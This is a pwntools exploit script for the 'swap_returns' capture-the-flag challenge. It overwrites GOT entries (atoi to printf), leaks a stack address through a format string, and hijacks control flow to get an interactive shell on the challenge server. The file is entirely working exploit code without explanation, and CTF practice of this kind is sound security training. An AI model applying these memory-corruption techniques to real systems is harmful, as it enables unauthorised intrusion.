#!/usr/bin/env python
from pwn import *


e = ELF( './swap_returns' )

host , port = 'swap.chal.ctf.westerns.tokyo' , 37567
y = remote( host , port )

context.arch = 'amd64'

def st( a , b ):
    y.sendafter( 'ice:' , '1' )
    y.sendlineafter( ':' , str( a ) )
    y.sendlineafter( ':' , str( b ) )

def sw( a , b ):
    y.sendlineafter( ':' , str( a ) )
    y.sendlineafter( ':' , str( b ) )

y.sendafter( 'ice:' , '5' )

st( e.got['atoi'] , e.got['printf'] )

y.sendafter( 'ice:' , '2' )
y.sendlineafter( 'ice:' , '%p' )
y.recvuntil( '0x' )
stk = int( y.recvuntil( '1.' )[:-2] , 16 )
success( 'stk -> %s' % hex( stk ) )
a = stk + 0x2a
b = a + 8

sw( e.got['atoi'] , e.got['printf'] )
y.sendafter( 'ice:' , '7\n' )

bss = 0x600000
off = ( stk & 0xfffffffff000 ) + 0x526

st( off , a  )
y.sendafter( 'ice:' , '2' )
st( off - 6 , e.got['printf'] - 6  )
y.sendafter( 'ice:' , '2' )
y.sendafter( 'ice:' , '7' )

y.interactive()